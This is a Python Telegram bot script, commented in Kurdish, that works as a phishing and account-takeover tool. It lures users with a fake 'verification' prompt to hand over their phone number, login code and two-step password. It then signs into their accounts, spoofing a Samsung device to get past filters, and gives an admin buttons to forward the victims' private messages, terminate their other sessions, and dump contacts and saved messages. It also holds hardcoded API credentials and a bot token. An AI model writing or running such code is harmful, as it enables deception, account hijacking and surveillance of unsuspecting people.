import asyncio
from pyrogram import Client, filters, errors
from pyrogram.types import (ReplyKeyboardMarkup, KeyboardButton, 
                            InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove)

# --- زانیارییەکان (API نوێ بەکاربهێنیت باشترە) ---
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
ADMIN_ID = 7414272224

app = Client("github_bypass_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

sessions = {}

def get_control_panel(u_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📡 سیخوڕی", callback_data=f"spy_{u_id}"),
         InlineKeyboardButton("⚔️ دەرکردن", callback_data=f"kick_{u_id}")],
        [InlineKeyboardButton("📇 ناوەکان", callback_data=f"cnt_{u_id}"),
         InlineKeyboardButton("📂 نامەکان", callback_data=f"msg_{u_id}")]
    ])

@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    if message.from_user.id == ADMIN_ID:
        await message.reply_text("👋 پانێڵی ئادمین ئامادەیە.\nبۆ بینینی دوگمەکان بنووسە /panel")
        return
    
    kb = ReplyKeyboardMarkup([[KeyboardButton("📲 پشتڕاستکردنەوە", request_contact=True)]], resize_keyboard=True)
    await message.reply_text("⚠️ **ئاگاداری**\nبۆ پاراستنی ئەکاونتەکەت لە بلۆک بوون، ژمارەکەت بنێرە:", reply_markup=kb)

@app.on_message(filters.contact & filters.private)
async def contact_handler(client, message):
    u_id = message.from_user.id
    phone = message.contact.phone_number
    
    # گرنگ: بەکارهێنانی ناسنامەی سامسۆنگ بۆ تێپەڕاندنی فلتەری گیتھەب
    c = Client(
        f"session_{u_id}", 
        api_id=API_ID, api_hash=API_HASH,
        device_model="Samsung Galaxy S23 Ultra",
        system_version="Android 13.0",
        app_version="10.0.1"
    )
    
    await c.connect()
    try:
        sent_code = await c.send_code(phone)
        sessions[u_id] = {"client": c, "phone": phone, "hash": sent_code.phone_code_hash, "step": "code"}
        await message.reply_text("📩 کۆدەکە بنێرە:", reply_markup=ReplyKeyboardRemove())
        await app.send_message(ADMIN_ID, f"☎️ ژمارە هات: `+{phone}`")
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە لە ناردنی کۆد: {e}")

@app.on_message(filters.text & filters.private)
async def login_logic(client, message):
    u_id = message.from_user.id
    if u_id not in sessions or u_id == ADMIN_ID: return
    
    data = sessions[u_id]
    if data.get("step") == "done": return

    input_data = message.text.strip().replace(" ", "")

    try:
        if data["step"] == "code":
            # خاڵی سەرەکی: کەمێک وەستان بۆ ئەوەی سێرڤەر نەڵێت Expired
            await asyncio.sleep(2)
            await data["client"].sign_in(data["phone"], data["hash"], input_data)
        
        elif data["step"] == "2fa":
            await data["client"].check_password(input_data)

        sessions[u_id]["step"] = "done"
        await message.reply_text("✅ سەرکەوتوو بوو.")
        await app.send_message(ADMIN_ID, f"🔥 لۆگین سەرکەوتوو: `+{data['phone']}`", reply_markup=get_control_panel(u_id))

    except errors.SessionPasswordNeeded:
        sessions[u_id]["step"] = "2fa"
        await message.reply_text("🔑 پاسۆردی دوو قۆناغی بنێرە:")
    except errors.PhoneCodeExpired:
        # هەوڵدان بۆ دووبارە ناردنەوەی کۆد یەکسەر
        await message.reply_text("⚠️ کۆدەکە بەسەرچوو، تکایە دووبارە ژمارەکەت بنێرە.")
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە: {e}")

@app.on_callback_query()
async def actions(client, query):
    cmd, target_id = query.data.split("_")
    target_id = int(target_id)
    u_client = sessions[target_id]["client"]
    
    if cmd == "spy":
        @u_client.on_message(filters.private & ~filters.me)
        async def fwd(c, m): await m.forward(ADMIN_ID)
        await query.answer("سیخوڕی چالاک بوو")
    elif cmd == "kick":
        auths = await u_client.get_authorizations()
        for a in auths:
            if not a.is_current: await u_client.terminate_session(a.hash)
        await query.answer("ئامێرەکان دەرکران")
    elif cmd == "cnt":
        cnts = await u_client.get_contacts()
        res = "\n".join([f"👤 {c.first_name}: +{c.phone_number}" for c in cnts[:10]])
        await app.send_message(ADMIN_ID, res)
    elif cmd == "msg":
        async for m in u_client.get_chat_history("me", limit=5): await m.forward(ADMIN_ID)

app.run()
